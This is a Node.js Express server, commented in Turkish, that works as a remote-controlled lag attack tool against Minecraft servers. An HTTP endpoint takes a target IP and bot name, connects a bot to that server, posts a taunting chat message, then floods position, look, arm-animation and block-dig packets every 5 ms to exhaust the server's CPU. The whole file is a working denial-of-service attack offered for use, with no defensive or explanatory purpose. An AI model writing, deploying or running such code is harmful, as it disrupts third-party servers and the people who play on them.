const express = require('express');
const mc = require('minecraft-protocol');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let client = null;
let lagInterval = null;

app.get('/bot-gonder', (req, res) => {
    const { ip, isim } = req.query;
    if (client) { client.end(); clearInterval(lagInterval); }

    console.log(`[OPERASYON] Hedef: ${ip} | Bot: ${isim}`);

    client = mc.createClient({
        host: ip,
        port: 25565,
        username: isim,
        version: "1.20.1",
        noDelay: true
    });

    client.on('success', () => {
        console.log("İçerideyiz! Lag protokolü hazırlanıyor...");
        
        setTimeout(() => {
            // Duyuru Yap (Toxic Mode)
            client.write('chat', { message: `§4§l[!] SISTEMINIZE GEMINI SIZDI! TPS COKUYOR...` });
            
            // LAG MAKİNESİ (Saniyede yüzlerce anlamsız veri)
            lagInterval = setInterval(() => {
                if(!client) return;
                // Sunucu işlemcisini yoran 4'lü paket kombosu
                client.write('position', { x: Math.random()*10, y: 64, z: Math.random()*10, onGround: false });
                client.write('arm_animation', { hand: 0 });
                client.write('look', { yaw: Math.random()*360, pitch: Math.random()*180, onGround: true });
                client.write('block_dig', { status: 0, location: { x: 1, y: 1, z: 1 }, face: 1 });
            }, 5); // 5ms hızında saldırı!
        }, 3000);
    });

    client.on('error', (err) => { console.log("Hata:", err.message); clearInterval(lagInterval); });
    res.send("Saldırı Başlatıldı!");
});

app.get('/bot-zipla', (req, res) => res.send("OK")); // Lamba için
app.listen(port, '0.0.0.0', () => console.log("Lag Motoru Devrede."));
